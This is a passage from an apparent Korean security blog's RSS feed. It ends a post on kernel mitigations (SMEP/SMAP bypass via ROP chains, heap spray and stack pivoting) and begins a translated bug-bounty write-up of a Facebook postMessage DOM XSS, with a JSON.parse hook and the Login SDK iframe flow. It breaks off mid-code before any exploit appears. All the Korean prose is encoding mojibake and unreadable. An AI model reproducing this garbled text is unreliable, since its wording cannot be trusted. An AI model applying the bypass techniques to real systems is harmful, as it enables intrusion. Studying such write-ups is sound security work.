&lt;p&gt;ì´ ë³´í˜¸ê¸°ë²•ì€ DEPì™€ ë§ˆì°¬ê°€ì§€ë¡œ ROPë¡œ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì»¤ë„ ì˜ì—­ì— ìˆëŠ” ê°€ì ¯ë“¤ë¡œ ROP chainì„ êµ¬ì„±í•˜ë©´ SMEPë¥¼ ìš°íšŒí•˜ì—¬ ì‹¤í–‰ íë¦„ì„ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;8-3-smap-supervisor-mode-access-prevention&quot;&gt;8-3. SMAP (Supervisor Mode Access Prevention)&lt;/h3&gt;

&lt;p&gt;SMAPëŠ” SMEPë¥¼ ë³´ì™„í•˜ê¸° ìœ„í•´ ì„¤ê³„ëœ ë³´í˜¸ ê¸°ë²•ì…ë‹ˆë‹¤. SMEPì˜ ê²½ìš° supervisor modeì—ì„œ ìœ ì € ì˜ì—­ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒë§Œ ë§‰ëŠ”ë‹¤ë©´, SMAPëŠ” user ì˜ì—­ì˜ íŠ¹ì • ì£¼ì†Œë¥¼ ì°¸ì¡°í•˜ëŠ”ê²ƒì„ ë§‰ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì˜ˆë¥¼ ë“¤ì–´, ìœ„ ëª…ë ¹ì–´ë¥¼ supervisor modeì—ì„œ ì‹¤í–‰í•  ë•Œ raxì— ìœ ì € ì˜ì—­ì˜ ì£¼ì†Œê°€ ì €ì¥ë˜ì–´ ìˆë‹¤ë©´ ìœ„ ëª…ë ¹ì–´ëŠ” ì‹¤í–‰ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;SMAPë¥¼ ìš°íšŒí•˜ëŠ” ëŒ€í‘œì ì¸ ë°©ë²•ìœ¼ë¡œëŠ” ì»¤ë„ì˜ heap ì˜ì—­ì— ROP chainì„ sprayí•˜ê³  ìŠ¤íƒ í”¼ë²—ì„ í†µí•´ ROPí•˜ëŠ” ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤. ì´ë•Œ heapì— ì›í•˜ëŠ” ê°’ì„ ì“°ê¸° ìœ„í•´ì„œ ì£¼ë¡œ heap sprayë¼ëŠ” ê¸°ë²•ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;9-reference&quot;&gt;9. Reference&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://security.cs.pub.ro/summer-school/wiki/session/10&quot;&gt;https://security.cs.pub.ro/summer-school/wiki/session/10&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.ffri.jp/assets/files/research/research_papers/SEH_Overwrite_CanSecWest2010.pdf&quot;&gt;https://www.ffri.jp/assets/files/research/research_papers/SEH_Overwrite_CanSecWest2010.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard&quot;&gt;https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.countercraft.eu/blog/post/arbitrary-vs-kernel/&quot;&gt;https://www.countercraft.eu/blog/post/arbitrary-vs-kernel/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://software.intel.com/sites/default/files/managed/4d/2a/control-flow-enforcement-technology-preview.pdf&quot;&gt;https://software.intel.com/sites/default/files/managed/4d/2a/control-flow-enforcement-technology-preview.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://eyalitkin.wordpress.com/2017/08/18/bypassing-return-flow-guard-rfg/&quot;&gt;https://eyalitkin.wordpress.com/2017/08/18/bypassing-return-flow-guard-rfg/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://nsfocusglobal.com/what-you-should-know-about-mitigation-bypass/&quot;&gt;https://nsfocusglobal.com/what-you-should-know-about-mitigation-bypass/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Protection_ring&quot;&gt;https://en.wikipedia.org/wiki/Protection_ring&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://2017.zeronights.org/wp-content/uploads/materials/ZN17_Matt_Recent%20Exploit%20Trend%20and%20Mitigation,%20Detection%20Tactics-Current.pdf&quot;&gt;https://2017.zeronights.org/wp-content/uploads/materials/ZN17_Matt_Recent Exploit Trend and Mitigation, Detection Tactics-Current.pdf&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Fri, 01 May 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-05-01/memory</link>
        <guid isPermaLink="true">http://localhost:4000/2020-05-01/memory</guid>
        
        <category>system</category>
        
        
      </item>
    
      <item>
        <title>iframe broker &amp; Story of Facebook DOM XSS</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ìµœì •ìˆ˜&lt;/p&gt;

&lt;p&gt;ì´ ê¸€ì€ &lt;a href=&quot;https://vinothkumar.me/&quot;&gt;Vinoth Kumar&lt;/a&gt;ê°€ ì§€ë‚œ 4ì›” Facebookì˜ DOM XSSë¥¼ ë°œê²¬í•˜ì—¬ ì œë³´í•˜ê³  2ë§Œ ë‹¬ëŸ¬ì˜ í¬ìƒê¸ˆì„ ë°›ì€ &lt;a href=&quot;https://vinothkumar.me/20000-facebook-dom-xss/&quot;&gt;ê²Œì‹œê¸€&lt;/a&gt;ì„ ë²ˆì—­í•œ ë‚´ìš©ì´ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì¶”ê°€ë¡œ í•´ë‹¹ ì·¨ì•½ì ì„ ì°¾ê¸° ìœ„í•´ &lt;a href=&quot;https://vinothkumar.me/&quot;&gt;Vinoth Kumar&lt;/a&gt;ê°€ ê°œë°œí•œ Iframeê³¼ Cross Window communications ë¡œê·¸ë¥¼ ì‰½ê²Œ í™•ì¸ í•  ìˆ˜ ìˆëŠ” í¬ë¡¬ ìµìŠ¤í…ì…˜ì„ ì‚¬ìš©í•˜ê³  ì–´ë–»ê²Œ ì ìš©í•  ìˆ˜ ìˆì„ì§€ ê³ ë¯¼í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;iframe-broker&quot;&gt;iframe broker&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;iframe brokerëŠ”  &lt;a href=&quot;https://vinothkumar.me/&quot;&gt;Vinoth Kumar&lt;/a&gt;ê°€ Cross Window Communication ë¡œê·¸ë¥¼ ì‰½ê²Œ í™•ì¸í•˜ê¸° ìœ„í•´ì„œ ì‘ì„±í•œ Chrome Extension ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;í•´ë‹¹ ë„êµ¬ì˜ ê°„ë‹¨í•œ ì›ë¦¬ëŠ” messageë¥¼ í›„í‚¹í•˜ì—¬ ë³´ì—¬ì£¼ëŠ” ë°©ì‹ì…ë‹ˆë‹¤&lt;/p&gt;

&lt;p&gt;JavascriptëŠ” ì•„ë˜ì™€ ê°™ì´ ê°„ë‹¨í•œ ìŠ¤í¬ë¦½íŠ¸ë¡œ í›„í‚¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;origin_parse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/* Something Do It! */&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/* ex) console.log(arg) */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;origin_parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;iframe brokerì˜ ì‚¬ìš©ë²•ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/vinothsparrow/iframe-broker
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìš°ì„  git clone ëª…ë ¹ì–´ë¥¼ í†µí•´ íŠ¹ì • í´ë”ì— iframe-brokerë¥¼ ë°›ì•„ì¤ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/bd2f2d57-db96-4a00-8b4b-95448a489543/9680797e-d1ef-4857-b3e2-0da9ee7ab169.png&quot; alt=&quot;/assets/bd2f2d57-db96-4a00-8b4b-95448a489543/9680797e-d1ef-4857-b3e2-0da9ee7ab169.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Chrome Extension ì¶”ê°€ë¥¼ ìœ„í•´ ê°œë°œì ëª¨ë“œ ì˜µì…˜ì„ í™œì„±í™” ì‹œì¼œì¤ë‹ˆë‹¤. í•´ë‹¹ ì˜µì…˜ì„ í™œì„±í™” ì‹œì¼œì£¼ê²Œë˜ë©´ &lt;code class=&quot;highlighter-rouge&quot;&gt;ì••ì¶•í•´ì œëœ í™•ì¥ í”„ë¡œê·¸ë¨ì„ ë¡œë“œí•©ë‹ˆë‹¤.&lt;/code&gt; ë²„íŠ¼ì´ ìƒê¸°ë©° í´ë¦­ì„ í†µí•´ clone í•´ì¤€ iframe-broker í´ë”ë¥¼ ì„ íƒí•´ì¤ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/85b6ceaf-3565-47cd-b65f-12aa7cb8b535/5b9b6572-8ba4-4984-a5d4-a72b0f832085.png&quot; alt=&quot;/assets/85b6ceaf-3565-47cd-b65f-12aa7cb8b535/5b9b6572-8ba4-4984-a5d4-a72b0f832085.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Iframe Brokerê°€ ì •ìƒì ìœ¼ë¡œ ë¡œë“œëœ ê²ƒì„ í™•ì¸ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/bd53c735-b1b8-40f8-a86c-bfd2d2a7abd7/a391c04c-77cb-4b68-aab7-690a51b4c54d.png&quot; alt=&quot;/assets/bd53c735-b1b8-40f8-a86c-bfd2d2a7abd7/a391c04c-77cb-4b68-aab7-690a51b4c54d.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ìœ„ì™€ ê°™ì´ Chrome Extensionì„ í†µí•´ Domainê°„ í†µì‹ í•˜ëŠ” ë©”ì„¸ì§€ë¥¼ ì‰½ê²Œ í™•ì¸ í•  ìˆ˜ ìˆìœ¼ë©° í´ë¼ì´ì–¸íŠ¸ ì‚¬ì´ë“œì˜ ì·¨ì•½ì ì„ ì°¾ëŠ”ë° í¸ë¦¬í•œ ë„êµ¬ë¼ëŠ” ìƒê°ì´ë“­ë‹ˆë‹¤. ì•„ë˜ëŠ” í•´ë‹¹ Chrome Extension ê°œë°œìê°€ ê°œë°œ í›„ Extensionì„ ì‚¬ìš©í•˜ë©´ì„œ ì§ì ‘ ì·¨ì•½ì ì„ ì°¾ì€ ë‚´ìš©ì„ ë²ˆì—­í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;story-of-20000-facebook-dom-xss&quot;&gt;Story of &lt;a href=&quot;https://vinothkumar.me/20000-facebook-dom-xss/&quot;&gt;$20000 Facebook DOM XSS&lt;/a&gt;&lt;/h1&gt;

&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;window.postMessage() methodë¥¼ ì‚¬ìš©í•˜ë©´ ìƒì„± ëœ í˜ì´ì§€ì™€ íŒì—… ì‚¬ì´ ë˜ëŠ” í˜ì´ì§€ì™€ í˜ì´ì§€ì— í¬í•¨ëœ iframe ì‚¬ì´ì™€ ê°™ì€ Window ê°ì²´ ê°„ì˜ cross-origin í†µì‹ ì„ ì•ˆì „í•˜ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. - &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage&quot;&gt;Mozilla postMessage Documentation&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;postMessage ë° ë„ë©”ì¸ ê°„ í†µì‹ ì— ëŒ€í•´ ë” ì•Œê³  ì‹¶ë‹¤ë©´ ì•„ë˜ ë¬¸ì„œë¥¼ ì½ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://javascript.info/cross-window-communication&quot;&gt;How cross window/frame communication happens in Javascript&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/&quot;&gt;https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://ngailong.wordpress.com/2018/02/13/the-mystery-of-postmessage/&quot;&gt;https://ngailong.wordpress.com/2018/02/13/the-mystery-of-postmessage/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;background&quot;&gt;Background&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;postMessageë¥¼ í†µí•œ DOM XSSëŠ” ê³¼ì†Œ í‰ê°€ ëœ ì·¨ì•½ì ì´ë©° ë§ì€ ë²„ê·¸ë°”ìš´í‹° í—Œí„°ë“¤ì—ê²ŒëŠ” ëˆˆì— ë„ì§€ ì•ŠëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ìµœê·¼ì— open dashboards ë° credentials ì·¨ì•½ì ì„ ì°¾ëŠ” ëŒ€ì‹  í´ë¼ì´ì–¸íŠ¸ ìª½ ì·¨ì•½ì ì„ ì°¾ê¸° ì‹œì‘í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;(&lt;a href=&quot;https://hackerone.com/vinothkumar&quot;&gt;HackerOneì— ë¦¬í¬íŠ¸ëœ ë³´ê³ ì„œ&lt;/a&gt;ë¥¼ ë³¸ë‹¤ë©´ ëŒ€ë¶€ë¶„ ë‚˜ì˜ ë¦¬í¬íŠ¸ëŠ” open dashboard ë˜ëŠ” Github credential leak ì…ë‹ˆë‹¤.)&lt;/p&gt;

&lt;p&gt;ì²˜ìŒì—ëŠ” XSSI, JSONP ë° postMessage ê´€ë ¨ ëœ ë³´ì•ˆ ë¬¸ì œë¥¼ ì°¾ê¸° ì‹œì‘í–ˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ XSSI ë° JSONP ì·¨ì•½ì ì€ ë§¤ìš° ë“œë¬¼ë©° &lt;a href=&quot;https://blog.reconless.com/samesite-by-default/&quot;&gt;SameSite ì¿ í‚¤&lt;/a&gt;ê°€ ë„ì… ëœ ì´í›„ ì´ ì·¨ì•½ì ì€ ì‚¬ë¼ì§ˆ ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ postMessage ì·¨ì•½ì ì„ ì‚´í´ ë³´ëŠ” ë° ì§‘ì¤‘í–ˆìŠµë‹ˆë‹¤. postMessage ì·¨ì•½ì ì€ ì£¼ë¡œ ë³´ì•ˆ ì—°êµ¬ì›ì´ ëŒ€ë¶€ë¶„ ë¬´ì‹œí•˜ì§€ë§Œ ë””ë²„ê¹…ì´ ì‰½ê³  ë°©í™”ë²½ì„ ìš°íšŒ í•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë˜í•œ ë””ë²„ê¹…ì„ ë” ì‰½ê²Œí•˜ê¸° ìœ„í•´ í˜ì´ì§€ì—ì„œ ë°œìƒí•˜ëŠ” cross window communicationì˜ view/logë¥¼ ìœ„í•œ &lt;a href=&quot;https://github.com/vinothsparrow/iframe-broker&quot;&gt;Chrome extensionì„ ê°œë°œ&lt;/a&gt; í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì¼ë°˜ì ìœ¼ë¡œ ì›¹ ì‚¬ì´íŠ¸ëŠ” ìœ„ì ¯, í”ŒëŸ¬ê·¸ì¸ ë˜ëŠ” ì›¹ SDKì—ì„œ iframe í†µì‹ ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ë”°ë¼ì„œ í˜ì´ìŠ¤ë¶ì˜ iframe ë³´ì•ˆ ë¬¸ì œë¥¼ ì°¾ìœ¼ë ¤ê³  ì‹œì‘í•˜ìë§ˆì &lt;a href=&quot;https://developers.facebook.com/&quot;&gt;https://developers.facebook.com&lt;/a&gt;ìœ¼ë¡œ ì´ë™í•˜ì—¬ Facebookì˜ third-party í”ŒëŸ¬ê·¸ì¸ì„ ë³´ê¸° ì‹œì‘í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ë¦¬ê³  cross-domain í†µì‹ ì„ ìœ„í•´ì„œ &lt;code class=&quot;highlighter-rouge&quot;&gt;Facebook Login SDK for JavaScript&lt;/code&gt;ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;v6.0/plugins/login_button.php&lt;/code&gt;ì—ì„œ proxy iframeì„ ë§Œë“¤ë©° proxy frameì—ì„œëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;Continue with Facebook&lt;/code&gt; ë²„íŠ¼ì„ ë Œë”ë§ í•´ì¤ë‹ˆë‹¤. ì—¬ê¸°ì„œ í¥ë¯¸ë¡œìš´ ì ì€ javascript SDKê°€ proxy frameì— ë²„íŠ¼ì˜ í´ë¦­ URLì´ í¬í•¨ ëœ ì´ˆê¸°í™” í˜ì´ë¡œë“œë¥¼ ì „ì†¡ í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë¡œê·¸ì¸ SDKì˜ íë¦„ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;Third&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Party&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;website&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Facebook&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Login&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SDK&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JavaScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;â†“&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iframe&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;amp;button_type=continue_with&amp;amp;channel=REDIRECT_URL&amp;amp;sdk=joey&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;iframe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;â†“&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Facebook Javascript SDKëŠ” ì´ˆê¸°í™” payloadë¥¼ iframe proxyì—ê²Œ ë³´ëƒ…ë‹ˆë‹¤.&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;iframe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contentWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;xdArbiterHandleMessage&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;loginButtonStateInit&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;INT_ID&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://www.facebook.com/v7.0/dialog/oauth?app_id=APP_ID&amp;amp;SOME_OTHER_PARAMS&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;dims&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenX&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenY&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;outerWidth&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1680&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;outerHeight&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span 